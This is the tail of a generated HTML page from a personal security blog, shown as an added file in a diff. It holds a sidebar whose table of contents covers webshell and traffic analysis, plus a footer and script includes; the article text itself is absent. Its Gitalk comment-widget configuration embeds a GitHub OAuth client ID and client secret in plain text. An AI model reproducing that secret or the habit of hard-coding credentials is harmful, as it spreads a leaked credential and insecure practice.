+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">59</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/Wh0ale" title="GitHub &rarr; https://github.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://medium.com/@Wh0ale" title="Medium &rarr; https://medium.com/@Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-medium"></i>Medium</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="/AttackerWh0ale@gmail.com" title="Mail &rarr; AttackerWh0ale@gmail.com"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://twitter.com/Wh0ale" title="Twitter &rarr; https://twitter.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#shell分析"><span class="nav-number">1.</span> <span class="nav-text">shell分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#php"><span class="nav-number">1.1.</span> <span class="nav-text">php</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jsp"><span class="nav-number">1.2.</span> <span class="nav-text">jsp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#aspx"><span class="nav-number">1.3.</span> <span class="nav-text">aspx</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#数据包分析"><span class="nav-number">2.</span> <span class="nav-text">数据包分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#php-1"><span class="nav-number">2.1.</span> <span class="nav-text">php</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jsp-1"><span class="nav-number">2.2.</span> <span class="nav-text">jsp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#aspx-1"><span class="nav-number">2.3.</span> <span class="nav-text">aspx</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#流量监测"><span class="nav-number">3.</span> <span class="nav-text">流量监测</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#php-2"><span class="nav-number">3.1.</span> <span class="nav-text">php</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jsp-2"><span class="nav-number">3.2.</span> <span class="nav-text">jsp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#aspx-2"><span class="nav-number">3.3.</span> <span class="nav-text">aspx</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wh0ale</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">1.4m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">21:52</span>
+</div>
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("03/31/2019 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script src="/lib/reading_progress/reading_progress.js"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  <script src="/js/utils.js?v=7.3.0"></script>
+  <script src="/js/motion.js?v=7.3.0"></script>
+
+  
+  <script src="/js/affix.js?v=7.3.0"></script>
+  <script src="/js/schemes/pisces.js?v=7.3.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.3.0"></script>
+<script src="/js/post-details.js?v=7.3.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.3.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.3.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '925b9aa350afc793e04c',
+    clientSecret: 'bcd92ef416b81450a12e6388b00dfa49f798437a',
+    repo: 'Wh0ale.github.io',
+    owner: 'Wh0ale',
+    admin: ['Wh0ale'],
+    id: md5(location.pathname),
+      language: window.navigator.language || window.navigator.userLanguage,
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+
+</body>
+</html>
